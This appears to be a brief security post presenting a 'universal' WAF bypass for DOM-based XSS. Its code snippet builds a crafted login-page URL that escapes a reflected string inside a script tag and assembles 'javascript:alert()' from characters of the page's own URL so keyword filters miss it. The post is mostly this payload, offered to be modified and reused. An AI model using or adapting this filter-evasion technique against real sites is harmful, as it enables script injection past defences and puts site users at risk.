## Universal WAF BYPASS for DOM XSS
I think such bypass should work on lot's of firewalls, here's the logical bypass I use :DD

For example if reflection is inside `<script>..."REFLECTION"...</script>```

You can use link after modifying below script and getting the crafted with payload link.

```
console.log(`view-source:https://REDACTEDHOSTNAME/login/?abcdefghijklmopqrstuvwxyz=0&next=mySafeStr"-(()=>{`+encodeURIComponent(`let k=location.href;location=k[40]+k[31]+'Vas'+k[33]+'rip'+k[49]+k[5]+k[31]+'l'+k[35]+'rt%28%29'`)
+`})()-"` )
```
